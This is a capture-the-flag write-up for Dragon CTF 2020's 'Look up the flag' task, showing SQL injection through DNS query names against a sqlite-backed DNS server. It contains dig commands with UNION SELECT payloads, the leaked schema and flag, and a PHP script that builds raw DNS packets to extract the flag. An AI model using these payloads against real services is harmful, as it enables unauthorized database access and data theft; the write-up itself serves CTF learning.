# Look up the flag - Dragon CTF 2020 (Network, 302p, 23 solved)

## Introduction
Look up the flag is a network task.

The address of a DNS server is given, with the instructions that the domain must
contain `31337`.

Resolving any domain that does not contain 31337 results in an error from the
DNS server:
```
;; ADDITIONAL SECTION:
Exception.in-exception.catch. 10 IN	TXT	"Name not L33t"
```

## Vulnerability
The remote DNS server looks up records from an SQL database. This can be
confirmed by querying a domain that contains a single quote:
```
$ dig @forward-lookup.hackable.software "31337'"       

[...]
;; QUESTION SECTION:
;31337'.				IN	A

;; ADDITIONAL SECTION:
OperationalError.in-exception.catch. 10	IN TXT	"near \"A\": syntax error"
[...]
```

## Exploitation
After digging a bit (pun intended), it becomes clear that the remote server uses
sqlite. The schema can be retrieved by querying the `sqlite_master` table.
```
$ dig @forward-lookup.hackable.software "31337-'UNION/**/SELECT/**/'TXT',sql/**/FROM/**/sqlite_master/*"

; <<>> DiG 9.16.8-Debian <<>> @forward-lookup.hackable.software 31337-'UNION/**/SELECT/**/'TXT',sql/**/FROM/**/sqlite_master/*
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 51190
;; flags: qr aa rd ra ad; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 0

;; QUESTION SECTION:
;31337-'UNION/**/SELECT/**/'TXT',sql/**/FROM/**/sqlite_master/*.	IN A

;; ANSWER SECTION:
your.query.lol.		10	IN	TXT	"CREATE TABLE dns (domain TEXT, type TEXT, value TEXT)"
your.query.lol.		10	IN	TXT	"CREATE TABLE thisIsVeryLongTableNameThatIsLongerThen64charactersAndRequireMagic (flag TEXT)"
```

The flag is located in a table that has a name longer than the 64 characters
allowed by the standard. `dig` does not allow querying such domains.

Fortunately, the server does not follow strictly the standard and accepts
domains with size up to 255 characters.

**Flag**: `DrgnS{DiggingForTheTreasureAndFlag}`

## Appendices
### pwn.php
```php
#!/usr/bin/php
<?php
const HOST = "35.246.141.229";
const PORT = 53;
const DATA = "31337-'UNION/**/SELECT/**/'TXT',flag/**/FROM/**/"
	. "thisIsVeryLongTableNameThatIsLongerThen64charactersAndRequireMagic"
	. "/*";

$packet  = "";
$packet .= pack("n", 0x0000); // tranasaction id
$packet .= pack("n", 0x8000); // flags

$packet .= pack("n", 1); // questions
$packet .= pack("n", 0); // answer rr
$packet .= pack("n", 0); // authority rr
$packet .= pack("n", 0); // additional rr

/* Question */
$packet .= chr(strlen(DATA)) . DATA;
$packet .= "\x00";

$packet .= pack("n", 0xFF); // TYPE  = ANY
$packet .= pack("n", 0xFF); // CLASS = ANY

$socket = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);
socket_connect($socket, HOST, PORT);
socket_write($socket, $packet);
echo socket_read($socket, 4096);
```
